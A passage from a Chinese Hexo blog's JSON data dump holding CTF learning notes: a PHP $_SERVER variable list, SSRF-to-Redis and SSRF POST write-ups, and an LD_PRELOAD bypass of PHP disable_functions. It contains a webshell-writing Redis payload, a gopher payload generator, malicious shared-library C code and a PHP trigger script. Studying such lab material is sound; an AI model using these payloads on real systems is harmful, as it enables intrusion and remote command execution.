认证功能，这个变量便是认证的类型</p>\n","site":{"data":{"friends":[{"name":"知乎专栏","url":"https://zhuanlan.zhihu.com/godweiyang","title":"访问主页","introduction":"算法码上来","avatar":"/medias/avatars/myzhihu.png"}],"musics":[{"name":"夜曲","artist":"周杰伦","url":"/medias/music/yequ.mp3","cover":"/medias/music/avatars/yequ.jpg"},{"name":"一路向北","artist":"周杰伦","url":"/medias/music/yiluxiangbei.mp3","cover":"/medias/music/avatars/yiluxiangbei.jpg"},{"name":"来自天堂的魔鬼","artist":"邓紫棋","url":"/medias/music/tiantangdemogui.mp3","cover":"/medias/music/avatars/tiantangdemogui.jpg"},{"name":"倒数","artist":"邓紫棋","url":"/medias/music/daoshu.mp3","cover":"/medias/music/avatars/daoshu.jpg"}]}},"excerpt":"","more":"<h1 id=\"SERVER\"><a href=\"#SERVER\" class=\"headerlink\" title=\"$_SERVER\"></a>$_SERVER</h1><p><a href=\"https://www.php.net/manual/zh/reserved.variables.server.php\" target=\"_blank\" rel=\"noopener\">官方文档</a></p>\n<p>$_SERVER – $HTTP_SERVER_VARS [已删除] — 服务器和执行环境信息</p>\n<hr>\n<h2 id=\"目录\"><a href=\"#目录\" class=\"headerlink\" title=\"目录\"></a>目录</h2><p>如果以<a href=\"https://www.php.net/manual/zh/features.commandline.php\" target=\"_blank\" rel=\"noopener\">命令行</a>方式运行 PHP，下面列出的元素几乎没有有效的(或是没有任何实际意义的)</p>\n<p>$_SERVER[‘HTTP_ACCEPT_LANGUAGE’]</p>\n<p>浏览器语言<br>$_SERVER[‘REMOTE_ADDR’] </p>\n<p>当前用户 IP 。<br>$_SERVER[‘REMOTE_HOST’] </p>\n<p>当前用户主机名<br>$_SERVER[‘REQUEST_URI’] </p>\n<p>URL</p>\n<p>$_SERVER[‘REMOTE_PORT’] </p>\n<p>端口。<br>$_SERVER[‘SERVER_NAME’] </p>\n<p>服务器主机的名称。<br>$_SERVER[‘PHP_SELF’]</p>\n<p>正在执行脚本的文件名<br>$_SERVER[‘argv’]</p>\n<p>传递给该脚本的参数。<br>$_SERVER[‘argc’] </p>\n<p>传递给程序的命令行参数的个数。<br>$_SERVER[‘GATEWAY_INTERFACE’]</p>\n<p>CGI 规范的版本。<br>$_SERVER[‘SERVER_SOFTWARE’] </p>\n<p>服务器标识的字串<br>$_SERVER[‘SERVER_PROTOCOL’] </p>\n<p>请求页面时通信协议的名称和版本<br>$_SERVER[‘REQUEST_METHOD’]</p>\n<p>访问页面时的请求方法<br>$_SERVER[‘QUERY_STRING’] </p>\n<p>查询(query)的字符串。<br>$_SERVER[‘DOCUMENT_ROOT’] </p>\n<p>当前运行脚本所在的文档根目录<br>$_SERVER[‘HTTP_ACCEPT’] </p>\n<p>当前请求的 Accept: 头部的内容。<br>$_SERVER[‘HTTP_ACCEPT_CHARSET’] </p>\n<p>当前请求的 Accept-Charset: 头部的内容。<br>$_SERVER[‘HTTP_ACCEPT_ENCODING’] </p>\n<p>当前请求的 Accept-Encoding: 头部的内容<br>$_SERVER[‘HTTP_CONNECTION’] </p>\n<p>当前请求的 Connection: 头部的内容。例如：“Keep-Alive”。<br>$_SERVER[‘HTTP_HOST’] </p>\n<p>当前请求的 Host: 头部的内容。<br>$_SERVER[‘HTTP_REFERER’] </p>\n<p>链接到当前页面的前一页面的 URL 地址。<br>$_SERVER[‘HTTP_USER_AGENT’] </p>\n<p>当前请求的 User_Agent: 头部的内容。<br>$_SERVER[‘HTTPS’]</p>\n<p>如果通过https访问,则被设为一个非空的值(on)，否则返回off<br>$_SERVER[‘SCRIPT_FILENAME’] </p>\n<p>当前执行脚本的绝对路径名。<br>$_SERVER[‘SERVER_ADMIN’] </p>\n<p>管理员信息<br>$_SERVER[‘SERVER_PORT’] </p>\n<p>服务器所使用的端口<br>$_SERVER[‘SERVER_SIGNATURE’] </p>\n<p>包含服务器版本和虚拟主机名的字符串。<br>$_SERVER[‘PATH_TRANSLATED’] </p>\n<p>当前脚本所在文件系统（不是文档根目录）的基本路径。<br>$_SERVER[‘SCRIPT_NAME’] </p>\n<p>包含当前脚本的路径。这在页面需要指向自己时非常有用。<br>$_SERVER[‘PHP_AUTH_USER’] </p>\n<p>当 PHP 运行在 Apache 模块方式下，并且正在使用 HTTP 认证功能，这个变量便是用户输入的用户名。<br>$_SERVER[‘PHP_AUTH_PW’] </p>\n<p>当 PHP 运行在 Apache 模块方式下，并且正在使用 HTTP 认证功能，这个变量便是用户输入的密码。<br>$_SERVER[‘AUTH_TYPE’] </p>\n<p>当 PHP 运行在 Apache 模块方式下，并且正在使用 HTTP 认证功能，这个变量便是认证的类型</p>\n"},{"title":"CTFHub中SSRF打Redis","date":"2021-09-10T06:01:08.635Z","top":false,"cover":false,"password":null,"toc":true,"mathjax":true,"summary":null,"_content":"\n> Redis相关协议\n>\n> [Redis配置详解](https://www.redis.com.cn/redis-configuration/)\n>\n> [浅析Redis中SSRF的利用](https://xz.aliyun.com/t/5665)\n\n这题进行写文件后执行命令。\n\nRedis命令如下：\n\n```bash\nflushall\nset 1 '<?php eval($_GET[\"cmd\"]);?>'\nconfig set dir /var/www/html\nconfig set dbfilename shell.php\nsave\n```\n\n这是我是直接拿带佬们的脚本打的，大概看了一下Redis原理与协议还有它的格式，需要找个时间自己动手写一下exp加深印象。\n\n稍微改了一下，能在python3.8跑，原exp应该是在python2环境中执行\n\n```python\nfrom urllib import parse\nprotocol=\"gopher://\"\nip=\"192.168.163.128\"\nport=\"6379\"\nshell=\"\\n\\n<?php eval($_GET[\\\"cmd\\\"]);?>\\n\\n\"\nfilename=\"shell.php\"\npath=\"/var/www/html\"\npasswd=\"\"\ncmd=[\"flushall\",\n     \"set 1 {}\".format(shell.replace(\" \",\"${IFS}\")),\n     \"config set dir {}\".format(path),\n     \"config set dbfilename {}\".format(filename),\n     \"save\"\n     ]\nif passwd:\n    cmd.insert(0,\"AUTH {}\".format(passwd))\npayload=protocol+ip+\":\"+port+\"/_\"\ndef redis_format(arr):\n    CRLF=\"\\r\\n\"\n    redis_arr = arr.split(\" \")\n    cmd=\"\"\n    cmd+=\"*\"+str(len(redis_arr))\n    for x in redis_arr:\n        cmd+=CRLF+\"$\"+str(len((x.replace(\"${IFS}\",\" \"))))+CRLF+x.replace(\"${IFS}\",\" \")\n    cmd+=CRLF\n    return cmd\n\nif __name__==\"__main__\":\n    for x in cmd:\n        payload += parse.quote(redis_format(x))\n    print(payload)\n```\n\n生成的攻击流量需要再次url编码后才行。\n\n写入一句话之后就可以进行命令执行啦。","source":"_posts/CTFHub中SSRF打Redis.md","raw":"---\ntitle: CTFHub中SSRF打Redis\ndate: {{ date }}\ntop: false\ncover: false\npassword:\ntoc: true\nmathjax: true\nsummary:\ntags: [SSRF,CTF]\ncategories: [SSRF,CTF]\n---\n\n> Redis相关协议\n>\n> [Redis配置详解](https://www.redis.com.cn/redis-configuration/)\n>\n> [浅析Redis中SSRF的利用](https://xz.aliyun.com/t/5665)\n\n这题进行写文件后执行命令。\n\nRedis命令如下：\n\n```bash\nflushall\nset 1 '<?php eval($_GET[\"cmd\"]);?>'\nconfig set dir /var/www/html\nconfig set dbfilename shell.php\nsave\n```\n\n这是我是直接拿带佬们的脚本打的，大概看了一下Redis原理与协议还有它的格式，需要找个时间自己动手写一下exp加深印象。\n\n稍微改了一下，能在python3.8跑，原exp应该是在python2环境中执行\n\n```python\nfrom urllib import parse\nprotocol=\"gopher://\"\nip=\"192.168.163.128\"\nport=\"6379\"\nshell=\"\\n\\n<?php eval($_GET[\\\"cmd\\\"]);?>\\n\\n\"\nfilename=\"shell.php\"\npath=\"/var/www/html\"\npasswd=\"\"\ncmd=[\"flushall\",\n     \"set 1 {}\".format(shell.replace(\" \",\"${IFS}\")),\n     \"config set dir {}\".format(path),\n     \"config set dbfilename {}\".format(filename),\n     \"save\"\n     ]\nif passwd:\n    cmd.insert(0,\"AUTH {}\".format(passwd))\npayload=protocol+ip+\":\"+port+\"/_\"\ndef redis_format(arr):\n    CRLF=\"\\r\\n\"\n    redis_arr = arr.split(\" \")\n    cmd=\"\"\n    cmd+=\"*\"+str(len(redis_arr))\n    for x in redis_arr:\n        cmd+=CRLF+\"$\"+str(len((x.replace(\"${IFS}\",\" \"))))+CRLF+x.replace(\"${IFS}\",\" \")\n    cmd+=CRLF\n    return cmd\n\nif __name__==\"__main__\":\n    for x in cmd:\n        payload += parse.quote(redis_format(x))\n    print(payload)\n```\n\n生成的攻击流量需要再次url编码后才行。\n\n写入一句话之后就可以进行命令执行啦。","slug":"CTFHub中SSRF打Redis","published":1,"updated":"2021-08-21T15:11:36.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cktfnuyd90003t8opga64ejya","content":"<blockquote>\n<p>Redis相关协议</p>\n<p><a href=\"https://www.redis.com.cn/redis-configuration/\" target=\"_blank\" rel=\"noopener\">Redis配置详解</a></p>\n<p><a href=\"https://xz.aliyun.com/t/5665\" target=\"_blank\" rel=\"noopener\">浅析Redis中SSRF的利用</a></p>\n</blockquote>\n<p>这题进行写文件后执行命令。</p>\n<p>Redis命令如下：</p>\n<pre class=\"line-numbers language-bash\"><code class=\"language-bash\">flushall\n<span class=\"token keyword\">set</span> 1 <span class=\"token string\">'&lt;?php eval(<span class=\"token variable\">$_GET</span>[\"cmd\"]);?>'</span>\nconfig <span class=\"token keyword\">set</span> <span class=\"token function\">dir</span> /var/www/html\nconfig <span class=\"token keyword\">set</span> dbfilename shell.php\nsave<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>这是我是直接拿带佬们的脚本打的，大概看了一下Redis原理与协议还有它的格式，需要找个时间自己动手写一下exp加深印象。</p>\n<p>稍微改了一下，能在python3.8跑，原exp应该是在python2环境中执行</p>\n<pre class=\"line-numbers language-python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> urllib <span class=\"token keyword\">import</span> parse\nprotocol<span class=\"token operator\">=</span><span class=\"token string\">\"gopher://\"</span>\nip<span class=\"token operator\">=</span><span class=\"token string\">\"192.168.163.128\"</span>\nport<span class=\"token operator\">=</span><span class=\"token string\">\"6379\"</span>\nshell<span class=\"token operator\">=</span><span class=\"token string\">\"\\n\\n&lt;?php eval($_GET[\\\"cmd\\\"]);?>\\n\\n\"</span>\nfilename<span class=\"token operator\">=</span><span class=\"token string\">\"shell.php\"</span>\npath<span class=\"token operator\">=</span><span class=\"token string\">\"/var/www/html\"</span>\npasswd<span class=\"token operator\">=</span><span class=\"token string\">\"\"</span>\ncmd<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token string\">\"flushall\"</span><span class=\"token punctuation\">,</span>\n     <span class=\"token string\">\"set 1 {}\"</span><span class=\"token punctuation\">.</span>format<span class=\"token punctuation\">(</span>shell<span class=\"token punctuation\">.</span>replace<span class=\"token punctuation\">(</span><span class=\"token string\">\" \"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"${IFS}\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n     <span class=\"token string\">\"config set dir {}\"</span><span class=\"token punctuation\">.</span>format<span class=\"token punctuation\">(</span>path<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n     <span class=\"token string\">\"config set dbfilename {}\"</span><span class=\"token punctuation\">.</span>format<span class=\"token punctuation\">(</span>filename<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n     <span class=\"token string\">\"save\"</span>\n     <span class=\"token punctuation\">]</span>\n<span class=\"token keyword\">if</span> passwd<span class=\"token punctuation\">:</span>\n    cmd<span class=\"token punctuation\">.</span>insert<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"AUTH {}\"</span><span class=\"token punctuation\">.</span>format<span class=\"token punctuation\">(</span>passwd<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\npayload<span class=\"token operator\">=</span>protocol<span class=\"token operator\">+</span>ip<span class=\"token operator\">+</span><span class=\"token string\">\":\"</span><span class=\"token operator\">+</span>port<span class=\"token operator\">+</span><span class=\"token string\">\"/_\"</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">redis_format</span><span class=\"token punctuation\">(</span>arr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    CRLF<span class=\"token operator\">=</span><span class=\"token string\">\"\\r\\n\"</span>\n    redis_arr <span class=\"token operator\">=</span> arr<span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">\" \"</span><span class=\"token punctuation\">)</span>\n    cmd<span class=\"token operator\">=</span><span class=\"token string\">\"\"</span>\n    cmd<span class=\"token operator\">+=</span><span class=\"token string\">\"*\"</span><span class=\"token operator\">+</span>str<span class=\"token punctuation\">(</span>len<span class=\"token punctuation\">(</span>redis_arr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">for</span> x <span class=\"token keyword\">in</span> redis_arr<span class=\"token punctuation\">:</span>\n        cmd<span class=\"token operator\">+=</span>CRLF<span class=\"token operator\">+</span><span class=\"token string\">\"$\"</span><span class=\"token operator\">+</span>str<span class=\"token punctuation\">(</span>len<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">.</span>replace<span class=\"token punctuation\">(</span><span class=\"token string\">\"${IFS}\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\" \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>CRLF<span class=\"token operator\">+</span>x<span class=\"token punctuation\">.</span>replace<span class=\"token punctuation\">(</span><span class=\"token string\">\"${IFS}\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\" \"</span><span class=\"token punctuation\">)</span>\n    cmd<span class=\"token operator\">+=</span>CRLF\n    <span class=\"token keyword\">return</span> cmd\n\n<span class=\"token keyword\">if</span> __name__<span class=\"token operator\">==</span><span class=\"token string\">\"__main__\"</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">for</span> x <span class=\"token keyword\">in</span> cmd<span class=\"token punctuation\">:</span>\n        payload <span class=\"token operator\">+=</span> parse<span class=\"token punctuation\">.</span>quote<span class=\"token punctuation\">(</span>redis_format<span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>生成的攻击流量需要再次url编码后才行。</p>\n<p>写入一句话之后就可以进行命令执行啦。</p>\n","site":{"data":{"friends":[{"name":"知乎专栏","url":"https://zhuanlan.zhihu.com/godweiyang","title":"访问主页","introduction":"算法码上来","avatar":"/medias/avatars/myzhihu.png"}],"musics":[{"name":"夜曲","artist":"周杰伦","url":"/medias/music/yequ.mp3","cover":"/medias/music/avatars/yequ.jpg"},{"name":"一路向北","artist":"周杰伦","url":"/medias/music/yiluxiangbei.mp3","cover":"/medias/music/avatars/yiluxiangbei.jpg"},{"name":"来自天堂的魔鬼","artist":"邓紫棋","url":"/medias/music/tiantangdemogui.mp3","cover":"/medias/music/avatars/tiantangdemogui.jpg"},{"name":"倒数","artist":"邓紫棋","url":"/medias/music/daoshu.mp3","cover":"/medias/music/avatars/daoshu.jpg"}]}},"excerpt":"","more":"<blockquote>\n<p>Redis相关协议</p>\n<p><a href=\"https://www.redis.com.cn/redis-configuration/\" target=\"_blank\" rel=\"noopener\">Redis配置详解</a></p>\n<p><a href=\"https://xz.aliyun.com/t/5665\" target=\"_blank\" rel=\"noopener\">浅析Redis中SSRF的利用</a></p>\n</blockquote>\n<p>这题进行写文件后执行命令。</p>\n<p>Redis命令如下：</p>\n<pre><code class=\"bash\">flushall\nset 1 &#39;&lt;?php eval($_GET[&quot;cmd&quot;]);?&gt;&#39;\nconfig set dir /var/www/html\nconfig set dbfilename shell.php\nsave</code></pre>\n<p>这是我是直接拿带佬们的脚本打的，大概看了一下Redis原理与协议还有它的格式，需要找个时间自己动手写一下exp加深印象。</p>\n<p>稍微改了一下，能在python3.8跑，原exp应该是在python2环境中执行</p>\n<pre><code class=\"python\">from urllib import parse\nprotocol=&quot;gopher://&quot;\nip=&quot;192.168.163.128&quot;\nport=&quot;6379&quot;\nshell=&quot;\\n\\n&lt;?php eval($_GET[\\&quot;cmd\\&quot;]);?&gt;\\n\\n&quot;\nfilename=&quot;shell.php&quot;\npath=&quot;/var/www/html&quot;\npasswd=&quot;&quot;\ncmd=[&quot;flushall&quot;,\n     &quot;set 1 {}&quot;.format(shell.replace(&quot; &quot;,&quot;${IFS}&quot;)),\n     &quot;config set dir {}&quot;.format(path),\n     &quot;config set dbfilename {}&quot;.format(filename),\n     &quot;save&quot;\n     ]\nif passwd:\n    cmd.insert(0,&quot;AUTH {}&quot;.format(passwd))\npayload=protocol+ip+&quot;:&quot;+port+&quot;/_&quot;\ndef redis_format(arr):\n    CRLF=&quot;\\r\\n&quot;\n    redis_arr = arr.split(&quot; &quot;)\n    cmd=&quot;&quot;\n    cmd+=&quot;*&quot;+str(len(redis_arr))\n    for x in redis_arr:\n        cmd+=CRLF+&quot;$&quot;+str(len((x.replace(&quot;${IFS}&quot;,&quot; &quot;))))+CRLF+x.replace(&quot;${IFS}&quot;,&quot; &quot;)\n    cmd+=CRLF\n    return cmd\n\nif __name__==&quot;__main__&quot;:\n    for x in cmd:\n        payload += parse.quote(redis_format(x))\n    print(payload)</code></pre>\n<p>生成的攻击流量需要再次url编码后才行。</p>\n<p>写入一句话之后就可以进行命令执行啦。</p>\n"},{"title":"CTFHub中SSRF使用POST","date":"2021-09-10T06:01:08.478Z","top":false,"cover":false,"password":null,"toc":true,"mathjax":true,"summary":null,"_content":"\n## 审计flag.php\n\n这里有一个点是`$_SERVER[\"REMOTE_ADDR\"]`是“可靠”的请求端ip地址，是服务端在进行TCP握手时获得的，从技术上来说是几乎不可能伪造的，与`$_SERVER[\"HTTP_X_FORWARDED_FOR\"]`和`$_SERVER[\"HTTP_CLIENT_IP\"]`这两个可以通过修改http报头轻松伪造的参数不同。\n\n\n\n**记得gopher的默认端口是70，如果要发送请求到其它端口，记得修改**\n\n简化一下流程：\n\n```\n1.侦测注入点\n2.找到攻击对象，如“flag.php”\n3.构造gopher数据（最常见的就是通过本地请求，本地抓包，然后手动或者脚本构造）\n4.进行攻击\n```\n\n> 参考\n>\n> https://liloong3t.com/2021/02/16/2021-2-16-ssrf-shi-yong-gopher-xie-yi/\n\n","source":"_posts/CTFHub中SSRF使用POST.md","raw":"---\ntitle: CTFHub中SSRF使用POST\ndate: {{ date }}\ntop: false\ncover: false\npassword:\ntoc: true\nmathjax: true\nsummary:\ntags: [SSRF,CTF]\ncategories: [SSRF,CTF]\n---\n\n## 审计flag.php\n\n这里有一个点是`$_SERVER[\"REMOTE_ADDR\"]`是“可靠”的请求端ip地址，是服务端在进行TCP握手时获得的，从技术上来说是几乎不可能伪造的，与`$_SERVER[\"HTTP_X_FORWARDED_FOR\"]`和`$_SERVER[\"HTTP_CLIENT_IP\"]`这两个可以通过修改http报头轻松伪造的参数不同。\n\n\n\n**记得gopher的默认端口是70，如果要发送请求到其它端口，记得修改**\n\n简化一下流程：\n\n```\n1.侦测注入点\n2.找到攻击对象，如“flag.php”\n3.构造gopher数据（最常见的就是通过本地请求，本地抓包，然后手动或者脚本构造）\n4.进行攻击\n```\n\n> 参考\n>\n> https://liloong3t.com/2021/02/16/2021-2-16-ssrf-shi-yong-gopher-xie-yi/\n\n","slug":"CTFHub中SSRF使用POST","published":1,"updated":"2021-08-21T15:12:45.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cktfnuyde0007t8op9fzzehoh","content":"<h2 id=\"审计flag-php\"><a href=\"#审计flag-php\" class=\"headerlink\" title=\"审计flag.php\"></a>审计flag.php</h2><p>这里有一个点是<code>$_SERVER[\"REMOTE_ADDR\"]</code>是“可靠”的请求端ip地址，是服务端在进行TCP握手时获得的，从技术上来说是几乎不可能伪造的，与<code>$_SERVER[\"HTTP_X_FORWARDED_FOR\"]</code>和<code>$_SERVER[\"HTTP_CLIENT_IP\"]</code>这两个可以通过修改http报头轻松伪造的参数不同。</p>\n<p><strong>记得gopher的默认端口是70，如果要发送请求到其它端口，记得修改</strong></p>\n<p>简化一下流程：</p>\n<pre><code>1.侦测注入点\n2.找到攻击对象，如“flag.php”\n3.构造gopher数据（最常见的就是通过本地请求，本地抓包，然后手动或者脚本构造）\n4.进行攻击</code></pre><blockquote>\n<p>参考</p>\n<p><a href=\"https://liloong3t.com/2021/02/16/2021-2-16-ssrf-shi-yong-gopher-xie-yi/\" target=\"_blank\" rel=\"noopener\">https://liloong3t.com/2021/02/16/2021-2-16-ssrf-shi-yong-gopher-xie-yi/</a></p>\n</blockquote>\n","site":{"data":{"friends":[{"name":"知乎专栏","url":"https://zhuanlan.zhihu.com/godweiyang","title":"访问主页","introduction":"算法码上来","avatar":"/medias/avatars/myzhihu.png"}],"musics":[{"name":"夜曲","artist":"周杰伦","url":"/medias/music/yequ.mp3","cover":"/medias/music/avatars/yequ.jpg"},{"name":"一路向北","artist":"周杰伦","url":"/medias/music/yiluxiangbei.mp3","cover":"/medias/music/avatars/yiluxiangbei.jpg"},{"name":"来自天堂的魔鬼","artist":"邓紫棋","url":"/medias/music/tiantangdemogui.mp3","cover":"/medias/music/avatars/tiantangdemogui.jpg"},{"name":"倒数","artist":"邓紫棋","url":"/medias/music/daoshu.mp3","cover":"/medias/music/avatars/daoshu.jpg"}]}},"excerpt":"","more":"<h2 id=\"审计flag-php\"><a href=\"#审计flag-php\" class=\"headerlink\" title=\"审计flag.php\"></a>审计flag.php</h2><p>这里有一个点是<code>$_SERVER[&quot;REMOTE_ADDR&quot;]</code>是“可靠”的请求端ip地址，是服务端在进行TCP握手时获得的，从技术上来说是几乎不可能伪造的，与<code>$_SERVER[&quot;HTTP_X_FORWARDED_FOR&quot;]</code>和<code>$_SERVER[&quot;HTTP_CLIENT_IP&quot;]</code>这两个可以通过修改http报头轻松伪造的参数不同。</p>\n<p><strong>记得gopher的默认端口是70，如果要发送请求到其它端口，记得修改</strong></p>\n<p>简化一下流程：</p>\n<pre><code>1.侦测注入点\n2.找到攻击对象，如“flag.php”\n3.构造gopher数据（最常见的就是通过本地请求，本地抓包，然后手动或者脚本构造）\n4.进行攻击</code></pre><blockquote>\n<p>参考</p>\n<p><a href=\"https://liloong3t.com/2021/02/16/2021-2-16-ssrf-shi-yong-gopher-xie-yi/\" target=\"_blank\" rel=\"noopener\">https://liloong3t.com/2021/02/16/2021-2-16-ssrf-shi-yong-gopher-xie-yi/</a></p>\n</blockquote>\n"},{"title":"LD_PRELOAD","date":"2021-09-10T06:01:08.321Z","top":false,"cover":false,"password":null,"toc":true,"mathjax":true,"summary":null,"_content":"\n# LD_PRELOAD\n\n## 目的\n\n- 通过LD_PRELOAD方法绕过disabled_functions限制\n\n## 思路\n\n绕过disabled_functions的四种手法\n\n1. 攻击后端组件，寻找存在命令注入的web应用常用后端组件，如**ImageMagick**的魔图漏洞、**bash**的破壳漏洞等\n2. 寻找未禁用的函数，常见命令执行的函数有**system()**、**exec()**、**shell_exec()**、**passthru()**，偏僻的**popen()**、**proc_open()**、**pcntl_exec()**等等，逐一尝试\n3. mod_cgi模式，尝试修改.htaccess，调整请求访问路由，绕过php.ini中的任何限制（让特定扩展名的文件直接和php-cgi通信）\n4. 利用环境变量**LD_PRELOAD**劫持系统函数，让外部程序加载恶意*.so，达到执行系统命令的效果\n\n此处只详细说明第四种方法。大致步骤如下\n\n- 生成一个自己的恶意动态链接库文件\n- 利用**putenv**设置LD_PRELOAD为自己的恶意动态链接库文件的路径\n- 配合php的某个函数去触发自己的恶意动态链接库文件\n- RCE并获取flag\n\n这里面的某个函数需要在运行的时候能够启动子进程，这样才能重新加载我们所设置的环境变量，从而劫持子进程所调用的库函数。\n\n## 什么是LD_PRELOAD\n\nLD_PRELOAD是linux中的一个环境变量，它可以影响程序运行时的链接（Runtime linker），它允许你定义在程序运行前优先加载的动态链接库。这个功能主要用作有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。一方面，我们可以以此功能来使用自己的或者更好的函数（无需别人的源码），而另一方面，我们也可以向别人的程序中注入恶意程序。\n\n## 利用条件\n\nphp.ini配置如下：\n\n```php\ndisable_functions=pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,dl,mail,system\n```\n\n- linux系统\n- **putenv**未被禁用\n- **mail**或**error_log**至少需要有一个未被禁用\n- 存在可写目录，需要上传**.so**文件\n\n## 原理\n\n**mail**或**error_log**函数会调用**sendmail**，而**sendmail**会调用**geteuid**函数，所以将其重写覆盖即可达到目的。\n\n## 题目做法\n\nCTFHub中LD_PRELOAD题目环境给了**readflag**文件，即可直接调用\n\n创建**hack.c**文件\n\n```c\n#include <stdlib.h>\n#include <stdio.h>\n\nvoid payload() {\n\tsystem(\"/readflag > /tmp/flag\");\n}\n\nint getuid(){\n    if(getenv(\"LD_PRELOAD\") == NULL)\n        return 0;\n    unsetenv(\"LD_PRELOAD\");\n    payload();\n}\n```\n\n还有一种优化版本\n\n```c\n#include <stdio.h>\n#include <unistd.h>\n#include <stdlib.h>\n__attribute__ ((__constructor__)) void xxx (void){\n    unsetenv(\"LD_PRELOAD\");\n    system(\"/readflag > /tmp/flag\");\n}\n```\n\n用`gcc -fPIC -shared hack.c -o hack.so`编译出动态链接库**hack.so**文件\n\n上传到`/tmp/`目录下，一般来说`/tmp/`目录都是有读写权限的\n\n调用脚本：\n\nshell.php\n\n```php\n<?php\n  putenv(\"LD_PRELOAD=/tmp/hack.so\");\n  error_log(\"a\",1);\n  mail(\"a@localhost\",\"\",\"\",\"\",\"\");\n?>\n```\n\n利用 LD_PRELOAD 环境变量, 加载 hack.so, 在 hack.so 中执行命令.\n\n我们可以直接利用 hack.so 反弹 shell, 或者将输出重定向到文件当中\n\n> 参考\n>\n> [警惕UNIX下的LD_PRELOAD环境变量](https://blog.csdn.net/haoel/article/details/1602108)\n>\n> [LD_PRELOAD](https://writeup.ctfhub.com/Skill/Web%E8%BF%9B%E9%98%B6/PHP/Bypass-disable-function/74ASRSoQTq8x2VatRWJR7R.html)\n>\n> [AntSword-Labs](https://github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions/1)\n\n","source":"_posts/Bypass_disable_function.md","raw":"---\ntitle: LD_PRELOAD\ndate: {{ date }}\ntop: false\ncover: false\npassword:\ntoc: true\nmathjax: true\nsummary:\ntags: [LD_PRELOA,Bypass_disable_function]\ncategories: LD_PRELOAD\n---\n\n# LD_PRELOAD\n\n## 目的\n\n- 通过LD_PRELOAD方法绕过disabled_functions限制\n\n## 思路\n\n绕过disabled_functions的四种手法\n\n1. 攻击后端组件，寻找存在命令注入的web应用常用后端组件，如**ImageMagick**的魔图漏洞、**bash**的破壳漏洞等\n2. 寻找未禁用的函数，常见命令执行的函数有**system()**、**exec()**、**shell_exec()**、**passthru()**，偏僻的**popen()**、**proc_open()**、**pcntl_exec()**等等，逐一尝试\n3. mod_cgi模式，尝试修改.htaccess，调整请求访问路由，绕过php.ini中的任何限制（让特定扩展名的文件直接和php-cgi通信）\n4. 利用环境变量**LD_PRELOAD**劫持系统函数，让外部程序加载恶意*.so，达到执行系统命令的效果\n\n此处只详细说明第四种方法。大致步骤如下\n\n- 生成一个自己的恶意动态链接库文件\n- 利用**putenv**设置LD_PRELOAD为自己的恶意动态链接库文件的路径\n- 配合php的某个函数去触发自己的恶意动态链接库文件\n- RCE并获取flag\n\n这里面的某个函数需要在运行的时候能够启动子进程，这样才能重新加载我们所设置的环境变量，从而劫持子进程所调用的库函数。\n\n## 什么是LD_PRELOAD\n\nLD_PRELOAD是linux中的一个环境变量，它可以影响程序运行时的链接（Runtime linker），它允许你定义在程序运行前优先加载的动态链接库。这个功能主要用作有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。一方面，我们可以以此功能来使用自己的或者更好的函数（无需别人的源码），而另一方面，我们也可以向别人的程序中注入恶意程序。\n\n## 